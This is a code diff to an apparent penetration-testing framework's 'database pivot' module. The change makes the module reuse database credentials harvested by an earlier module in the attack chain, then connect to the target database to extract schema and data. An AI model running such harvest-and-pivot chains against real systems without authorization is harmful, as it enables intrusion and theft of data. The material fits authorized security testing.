@@ -34,6 +34,7 @@ class DatabasePivotModule(BaseExecutionModule):
             module_id="database_pivot.exploit",
             title="Database Pivot - Connect and Extract Data",
             risk_level=RiskLevel.DESTRUCTIVE,
+            domain="database",
             description=(
                 "Uses harvested database credentials to connect to the target "
                 "database and extract schema information, tables, and data."
@@ -47,12 +48,38 @@ class DatabasePivotModule(BaseExecutionModule):
     def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
         params = params or {}
         db_type = params.get("db_type", "postgres").lower()
-        db_host = params.get("db_host", "localhost")
-        db_port = params.get("db_port", _default_port(db_type))
+        db_host = params.get("db_host")
+        db_port = params.get("db_port")
         db_name = params.get("db_name", "postgres")
-        username = params.get("username", "postgres")
-        password = params.get("password", "")
+        username = params.get("username")
+        password = params.get("password")
         timeout = params.get("timeout", TIMEOUT)
+
+        # Fall back to credentials harvested earlier in the chain (e.g. by
+        # database_credential_harvest.dynamic_creds) when none were supplied
+        # explicitly — this is what makes harvest → pivot work end to end.
+        if not (username and password):
+            harvested = _get_db_creds(context)
+            if harvested:
+                cred = harvested[0]
+                username = username or cred.get("username")
+                password = password or cred.get("password")
+                db_host = db_host or cred.get("host")
+                db_port = db_port or cred.get("port")
+
+        if not (username and password):
+            return ExecutionResult(
+                status="skipped",
+                message=(
+                    "No database credentials supplied and none found in context. "
+                    "Run database_credential_harvest.dynamic_creds first or pass "
+                    "username/password params."
+                ),
+                evidence={"missing": ["credentials"]},
+            )
+
+        db_host = db_host or "localhost"
+        db_port = db_port or _default_port(db_type)
 
         # Bağımlılık kontrolü
         if db_type == "postgres" and not PSYCOPG2_AVAILABLE:
@@ -146,6 +173,28 @@ class DatabasePivotModule(BaseExecutionModule):
 def _default_port(db_type: str) -> int:
     ports = {"postgres": 5432, "mysql": 3306, "mssql": 1433}
     return ports.get(db_type, 5432)
+
+
+def _get_db_creds(context):
+    """Collect database credentials stored on the execution context.
+
+    Looks at ``context.db_credentials`` (direct attribute) and at finding
+    evidence produced by the credential harvest module
+    (``evidence["credentials"]`` entries with username/password).
+    """
+    creds = []
+
+    direct = getattr(context, "db_credentials", None)
+    if direct:
+        creds.extend(direct)
+
+    for finding in getattr(context, "findings", []):
+        evidence = finding.get("evidence", {}) or {}
+        for cred in evidence.get("credentials", []) or []:
+            if isinstance(cred, dict) and "username" in cred and "password" in cred:
+                creds.append(cred)
+
+    return creds
 
 
 def _connect_database(db_type, host, port, database, username, password, timeout):
